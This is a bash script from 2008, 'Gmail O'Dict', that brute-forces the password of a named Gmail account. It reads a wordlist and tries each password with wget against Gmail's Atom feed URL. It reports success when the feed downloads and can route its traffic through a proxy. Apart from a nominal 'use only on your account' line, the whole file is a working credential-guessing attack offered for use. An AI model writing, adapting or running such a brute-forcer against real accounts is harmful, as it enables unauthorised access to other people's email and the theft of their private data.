#!/bin/bash
#
# Gmail O'Dict
# Version 0.2
# Attack Gmail accounts by dictionary
# Under GPLv3 terms
#
# Use this only on your account, or don't use it at all!
#
# Requirements: wget
#
# Pferor <pferor [AT] gmail [DOT] com>
# 2008-12-15

## Procedure explanation:
##
## Gmail accounts has enabled an ATOM feed just for Gmail users
## That feed can be reached using the following URL
##      https://username@password:mail.google.com/mail/feed/atom
##
## This script attacks by dictionary an account given by username
## Example:
## Seeks for password using 'dictionary' in as wordlist
## in account: username@gmail.com. Color enabled.
##      gmailodict.sh -u username -p dictionary -cv
##
## wget is a non-interactive network downloader.
## The goal is to try passowrds until a file called 'atom'
## is downloaded. If this file is successfully downloaded
## it means we have accesed the account.
## At the end of this script, atom feed is removed
##
## Using proxy?
## wget will use proxy defined in environment variable
## HTTP_PROXY (or http_proxy)
##
## Example
##      HTTP_PROXY=http://localhost:8118/
##      http_proxy=$HTTP_PROXY
##      export HTTP_PROXY http_proxy
##

VERSION="0.2"

## Vars
GMAILHDR="https://"                             # gmail header
GMAILURL="mail.google.com/mail/feed/atom"       # gmail URL
WGETOPTS="--no-check-certificate --quiet"       # wget options
GMAILOUT="atom"                                 # gmail output

## Display usage
function showUsage {
    echo "Usage: ${0} <options>"
    echo "  -u <user> -p <dict> Attack begins on Gmail user 'user' using wordlist 'dict'"
    echo "  -v                  Verbose mode"
    echo "  -c                  Colored output"
    echo "  -V                  Displays version"
    echo "  -h                  Displays this help"
    echo ""
    echo "  'dict' is the wordlist, one word per line."
}

## Display version
function showVersion {
    echo -e "${0}"
    echo -e "version: $VERSION"
}

## Default or initial values
USERNAME=""
WORDLIST=""
COLOR=0
VERBOSE=0

## Get options
while getopts "hu:p:cvV" OPTION
do
    case $OPTION in
        h)
            showUsage
            exit 0
            ;;
        u)
            USERNAME=$OPTARG
            ;;
        p)
            WORDLIST=$OPTARG
            ;;
        c)
            COLOR=1
            ;;
        v)
            VERBOSE=1
            ;;
        V)
            showVersion
            exit 0
            ;;
        ?)
            showUsage
            exit 1
    esac
done

## set color if enabled
if [ $COLOR = 1 ]; then
    COLORED='\e[1;31m'      # red
    UNCOLORED='\e[0m'       # no color

else
    COLORED=""
    UNCOLORED=""
fi


## username and password must be entered together
if [[ -z $USERNAME ]] || [[ -z $WORDLIST ]]; then
    showUsage
    exit 1
fi

## if dictionary does not exist
if [ ! -f $WORDLIST ]; then
    echo "File '$WORDLIST' does not exist" >&2
    exit 1
fi

## if Gmail output file exists (atom)
if [ -f $GMAILOUT ]; then
    echo "A file named '$GMAILOUT' still exist in this directory. Please delete it or use this script under another directory" >&2
    exit 1
fi

## start attack!  With 'cat $WORDLIST | while read PASSWORD; do...'
## spaces in words will be read as normal characters but
## authentication will fail in that case. Using 'for PASSWORD in `cat
## $WORDLIST`; do...', spaces will truncate words. It is recommended
## to use dictionaries without spaces between words
for PASSWORD in `cat $WORDLIST`; do
        # separation depending on $PASSWORD lenght
    BLANKS=" "
    BLANKSNUM=$[12-${#PASSWORD}]
            for ((i=0; i<=$BLANKSNUM; i++)); do
                BLANKS=${BLANKS}' '
            done

            if [ $VERBOSE = 1 ]; then
                echo -e "[${PASSWORD}]${BLANKS}${GMAILHDR}${USERNAME}:${COLORED}${PASSWORD}${UNCOLORED}@${GMAILURL}"
            fi
            wget ${GMAILHDR}${USERNAME}:${PASSWORD}@${GMAILURL} $WGETOPTS
            if [ -f $GMAILOUT ]; then
                echo -e "Password found: ${COLORED}$PASSWORD${UNCOLORED}"
                rm $GMAILOUT    #delete Gmail file (atom)
                exit 0;
            fi
done

## if script reaches this line, password was not found
echo "Password not found. Try using another dictionary" >&2
exit 1

